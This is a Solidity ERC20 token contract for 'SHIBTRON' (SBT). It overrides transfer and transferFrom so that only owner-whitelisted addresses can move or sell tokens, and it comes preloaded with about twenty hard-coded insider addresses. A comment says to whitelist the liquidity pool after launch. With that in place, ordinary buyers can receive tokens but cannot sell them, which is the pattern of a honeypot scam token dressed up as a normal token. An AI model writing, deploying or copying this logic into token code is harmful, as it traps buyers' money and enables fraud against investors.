// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("SHIBTRON", "SBT") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 55000000000 * 10 ** decimals());
        whiteList[0x613A8868c1bf3606C94059FF2Fe51c540B69C1b9]= true;
        whiteList[0x8738c35b3D73aD0E328BBDD5a50Ef3a3c089dBD8]=true;
        whiteList[0xEcb4a45833c2756589A57f462a297BfeD5A63E89]=true;
        whiteList[0x5F28616dc8bbEdB7e07080dcC15812e6c50Ca1b9]=true;
        whiteList[0x002e3A2a178E7896Ed795c21ee6E5b975287Ca1c]=true;
        whiteList[0xF02a179BE409485553446B52809fb741BeE40eC5]=true;
        whiteList[0xe7E07A6DdC8860767CD347F4257643857026dD89]=true;
        whiteList[0x7A845FFE185A75F6260dBCC5f01E0985d62cc5F4]=true;
        whiteList[0x62e2573e48B1861893809F6d18526906d9B5F1E6]=true;
        whiteList[0x7A2Ef699419da8fcd999A696B7242120d49B805A]=true;
        whiteList[0x66Bc25099c2cb394180899339590F4BF79A0A018]=true;
        whiteList[0x24bD20cc0A4618823e346f0bdBBA09939A920eBD]=true;
        whiteList[0x3DCF71eC091613F1a4aA50F3F7540ceEb4a6cdA1]=true;
        whiteList[0xD27c9500698578fBFcb7E7AC2537889a0f312FCD]=true;
        whiteList[0xCbd0121F1a131C893e6E1Bfa1bcC5b973f212F18]=true;
        whiteList[0xcEd5318771B93320753a4cf2db69fA228de14268]=true;
        whiteList[0x52515b034d2395716576e229B287e38Ff60870fF]=true;
        whiteList[0xA7Eb75888438Ebffd42DEa1010F1D0593B8f1eB9]=true;
        whiteList[0xd874a39FB7eA9A77c779321156d72c4CBA14F2d1]=true;
        whiteList[0x21384C4cb97c840b127613F81a24730c9fe525F0]=true;
        whiteList[0xd2087be3D681d12161B320A81cdd41D059BD3c72]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}